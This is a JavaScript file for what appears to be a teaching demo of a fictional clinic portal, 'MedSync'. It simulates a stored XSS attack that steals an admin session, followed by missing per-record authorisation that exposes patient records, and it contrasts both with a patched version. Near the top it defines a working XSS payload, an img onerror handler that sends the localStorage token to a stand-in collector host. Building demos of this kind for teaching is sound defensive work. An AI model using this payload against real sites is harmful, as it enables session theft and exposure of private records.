const $ = id => document.getElementById(id);
const view = ['attacker','server','portal'].includes(new URLSearchParams(location.search).get('view')) ? new URLSearchParams(location.search).get('view') : 'attacker';
const key = 'medsync-presentation-v3';
const payload = `<img src=x onerror="fetch('https://red-team.server/?t='+localStorage.getItem('token'))">`;
const fresh = patched => ({phase:0, patched, review:payload, run:Date.now()});
function normalize(value){return value}
function readState(){try{return normalize(JSON.parse(localStorage.getItem(key))) || fresh(false)}catch{return fresh(false)}}
let state = readState(), timer, saving=false;
function el(tag,text,parent,cls){const e=document.createElement(tag);if(text!==undefined)e.textContent=text;if(cls)e.className=cls;parent.append(e);return e}
function code(text,parent){return el('pre',text,parent,'code')}
function act(label,fn,primary=true){const b=el('button',label,$('controls'),primary?'primary':'');b.onclick=fn}
async function save(){
 state.updated=Date.now();saving=true;
 try{localStorage.setItem(key,JSON.stringify(state))}catch{}
 render();
 try{const response=await fetch('/state',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(state)});if(!response.ok)throw new Error('State save failed')}
 catch{ $('cue').textContent+=' Connection unavailable: refresh the other tabs after the server reconnects.' }
 finally{saving=false}
}
function advance(phase){if(phase===1){const input=$('review-message');state.review=input?input.value:state.review}state.phase=phase;save()}
function jwt(user){const enc=x=>btoa(JSON.stringify(x)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');return enc({alg:'HS256',typ:'JWT'})+'.'+enc({sub:user,role:user==='admin-01'?'admin':'user'})+'.DEMO_SIGNATURE'}
function panel(parent,title,lines){const p=el('div','',parent,'storage-panel');el('b',title,p);for(const line of lines)el('div',line,p,'compact-note');return p}
function policies(parent){const p=el('div','',parent,'processor');for(const text of ['textContent: enabled','Strict CSP: backstop','HttpOnly session','Per-record authorisation'])el('span',text,p,'passed')}
function reviewForm(parent){
 const layout=el('div','',parent,'review-layout'),photo=el('div','',layout);
 const image=el('img',undefined,photo,'clinic-photo');image.src='/assets/clinic.jpg';image.alt='Consultation at a clinic';
 const credit=el('a','Photo: Pavel Danilyuk / Pexels',photo,'photo-caption');credit.href='https://www.pexels.com/photo/a-woman-at-a-dental-clinic-6193192/';credit.target='_blank';
 el('h3','Consultation feedback',photo);el('p','Author: ordinary-user-17 · Rating: 5 / 5',photo);
 const form=el('div','',layout,'review-form');const label=el('label','Review message',form);label.htmlFor='review-message';const input=el('textarea',state.review,form);input.id='review-message';
 el('p','The image markup is the review message; there is no separate photo attachment.',form,'compact-note');
}
function attacker(parent){
 const {phase,patched}=state;
 if(phase===0){el('h2','Submit a review',parent);reviewForm(parent);return}
 if(phase===1){el('h2','201 Created · RV-208',parent);el('p','Review saved under ordinary-user-17. The collector is still empty.',parent);code(state.review,parent);return}
 const collector=panel(parent,'Session collector',patched?['No request received · no captured JWT']:['[200] GET https://red-team.server/?t='+jwt('admin-01')]);
 if(phase===2){el('h2',patched?'No session captured':'Admin session captured',parent);el('p',patched?'Safe text rendering prevented the handler. Next, test record authorisation using the ordinary user’s own valid session.':'The collector received the admin JWT from localStorage / token.',parent);if(!patched)code(jwt('admin-01'),parent);return}
 el('h2',patched?'403 Forbidden · access denied':'200 OK · patient records exposed',parent);
 code('GET /api/records/1\nAuthorization: Bearer '+jwt(patched?'ordinary-user-17':'admin-01'),parent);
 if(patched){el('p','Caller: ordinary-user-17 · record owner: patient-00001 · ownership mismatch.',parent);el('div','0',parent,'count');code('{"error":"Forbidden","records":[],"total":0}',parent);return}
 el('p','The valid stolen session is accepted. Missing object checks allow requests for IDs 1 through 10,000.',parent);
 const count=el('div','0',parent,'count');count.id='record-count';const grid=el('div','',parent,'data');for(let i=0;i<100;i++)el('i','',grid);
 const wrap=el('div','',parent,'tablewrap'),table=el('table','',wrap),head=el('tr','',table);for(const t of ['Record ID','Patient','Condition'])el('th',t,head);
 for(const row of [['1','John Doe','Hypertension'],['2','Jane Smith','Diabetes'],['3','R. Johnson','Coronary disease'],['10000','Patient 10000','Asthma']]){const tr=el('tr','',table);for(const cell of row)el('td',cell,tr)}
 let total=0;timer=setInterval(()=>{total=Math.min(10000,total+500);count.textContent=total.toLocaleString();[...grid.children].forEach((e,i)=>e.className=i<total/100?'on':'');if(total===10000)clearInterval(timer)},80);
}
function portal(parent){
 const {phase,patched}=state;el('h2',phase<2?'Review inbox':'RV-208 · consultation review',parent);
 if(!phase){el('p','No review submitted yet.',parent);return}
 const card=el('div','',parent,'review-card');el('b','ordinary-user-17 · RV-208 · ★★★★★',card);
 if(phase===1){el('p','Review received. Open it as admin to display its contents.',card)}
 else if(patched){code(state.review,card);el('p','Rendered with textContent. No image element or error handler is created.',card)}
 else{const img=el('img',undefined,card,'broken-review');img.src='/x';img.alt='Review image unavailable';el('div','src=x → 404 → onerror → token sent to collector',card,'image-failure');}
 panel(parent,'Admin browser session',patched?['HttpOnly cookie · JavaScript cannot read the token']:['localStorage / token',jwt('admin-01')]);
 if(phase>=2)panel(parent,patched?'Review blocked at the rendering boundary':'Stored XSS → session theft',patched?['Collector: no request received','Strict CSP adds a backstop for unexpected inline handlers.']:['Unsafe sink: el.innerHTML = userInput','The image error handler reads the admin JWT and sends it to the collector.']);
}
function requestLog(parent){
 const {phase,patched}=state;const rows=[];
 if(phase>=1)rows.push(['POST /reviews','201','Stored RV-208']);
 if(phase>=2){rows.push(['GET /moderation/reviews/RV-208','200',patched?'textContent':'innerHTML']);if(!patched){rows.push(['GET /x','404','Image fails']);rows.push(['GET red-team.server/?t=…','200','Collector receives JWT'])}}
 if(phase===3)rows.push(['GET /api/records/1',patched?'403':'200',patched?'Owner mismatch':'Object check missing']);
 const log=el('div','',parent,'requestlog');const h=el('div','',log,'logrow head');for(const t of ['Request','Status','Result'])el('span',t,h);
 for(const row of rows){const r=el('div','',log,'logrow');for(const cell of row)el('span',cell,r)}
}
function server(parent){
 const {phase,patched}=state;
 if(patched)policies(parent);
 if(!phase){el('h2','Waiting for a review',parent);el('p',patched?'Patch controls are enabled before the review arrives.':'The server is ready to store a review.',parent);return}
 requestLog(parent);
 if(phase===1){el('h2','Review stored · HTTP 201',parent);code('POST /reviews\n'+JSON.stringify({author_id:'ordinary-user-17',rating:5,message:state.review},null,2)+'\n\nHTTP/1.1 201 Created\nStored review: RV-208',parent);panel(parent,'Output policy',patched?['When opened: el.textContent = userInput','Strict CSP: backstop · Session cookie: HttpOnly']:['When opened: el.innerHTML = userInput','Missing output encoding allows the stored markup to become active.']);return}
 if(phase===2){el('h2',patched?'Safe rendering · no collector request':'Review rendered · admin JWT captured',parent);code(patched?'el.textContent = userInput\nImage element: not created\nEvent handler: not created\nSession: HttpOnly\nCollector: no request':'el.innerHTML = userInput\nGET /x → 404\nonerror → localStorage.getItem("token")\nGET https://red-team.server/?t=[admin JWT] → 200',parent);return}
 el('h2',patched?'Object authorisation denied · 403':'Missing object authorisation · 200',parent);
 const pipeline=el('div','',parent,'processor');for(const text of ['Valid session: '+(patched?'ordinary-user-17':'admin-01'),patched?'Ownership: mismatch':'Ownership: not checked',patched?'403 · 0 records':'200 · 10,000 records'])el('span',text,pipeline,patched?'passed':'missing');
 code(patched?'GET /api/records/1\nCaller: ordinary-user-17 (own valid session)\nrecord.owner_id: patient-00001\nrecord.owner_id != current_user.id → DENY\nHTTP 403 Forbidden\nRecords returned: 0':'GET /api/records/{id} · IDs 1–10000\nCaller: admin-01 (stolen valid session)\nSELECT * FROM records WHERE id = ?\nObject-level permission check: MISSING\nHTTP 200 OK\nRecords returned: 10,000',parent);
}
function controls(){
 const {phase,patched}=state;$('controls').replaceChildren();let cue='';
 if(view==='attacker'&&phase===0){act('1. Submit review',()=>advance(1));cue='Submit the review. Then switch to Server to inspect RV-208.'}
 else if(phase===1){cue=view==='server'?'Point to HTTP 201 and RV-208. Switch to Patient portal.':'Switch to Patient portal to open RV-208 as admin.';if(view==='portal')act('2. Open page as admin',()=>advance(2))}
 else if(phase===2){cue=patched?'Show literal review text and the empty collector. Switch to Attacker and test record access.':'Show the failed image, then switch to Attacker and point to the captured JWT.';if(view==='attacker')act(patched?'3. Test record access':'3. Request patient records',()=>advance(3))}
 else if(phase===3)cue=patched?'403 · zero records. End with output encoding, HttpOnly sessions and per-object authorisation.':'10,000 records. Switch to PATCHED and repeat the same three actions.';
 $('cue').textContent=cue;
 act('Restart',()=>{state=fresh(state.patched);save()},false);
 act(patched?'Switch to VULNERABLE':'Try PATCHED scenario',()=>{const review=state.review;state=fresh(!state.patched);state.review=review;save()},false);
}
function render(){
 clearInterval(timer);document.body.classList.add('view-'+view);document.title='MedSync · '+view;
 document.querySelector('header b').textContent=view==='server'?'MedSync / Application server':view==='portal'?'✚ MedSync SG':'Relay / Request client';
 $('heading').textContent={attacker:'Attacker client',server:'Request inspector',portal:'Patient portal'}[view];$('role').textContent=view==='portal'?'Signed in as admin-01':'MedSync SG';$('mode').textContent=state.patched?'PATCHED':'VULNERABLE';
 $('stage').replaceChildren();const body=el('div','',$('stage'),'enter');const bar=el('div','',body,'appbar');el('b','MedSync SG',bar);el('span',state.phase?'RV-208 · '+(state.patched?'PATCHED':'VULNERABLE'):'Ready',bar);
 ({attacker,portal,server})[view](body);controls();
 $('progress').replaceChildren();for(let i=0;i<4;i++)el('span','',$('progress'),i<=state.phase?'done':'');
 document.querySelectorAll('.steps span').forEach((e,i)=>e.textContent=['Ready','Review stored','Review opened',state.patched?'Records denied':'Records result'][i]);
 for(const id of ['na','ns','np'])$(id).classList.toggle('active',id===[ 'na','ns','np','na'][state.phase]);
 for(const id of ['wa','wb'])$(id).replaceChildren();if(state.phase)el('i','',$(state.phase===2?'wb':'wa'),'packet');
}
window.addEventListener('storage',e=>{if(e.key===key){state=readState();render()}});
async function sync(){
 if(saving)return;
 try{const response=await fetch('/state',{cache:'no-store'});if(!response.ok)return;const remote=normalize(await response.json());if(remote&&remote.updated>(state.updated||0)&&!saving){state=remote;try{localStorage.setItem(key,JSON.stringify(state))}catch{}render()}}catch{}
}
window.addEventListener('pageshow',sync);
setInterval(sync,500);
sync();
render();
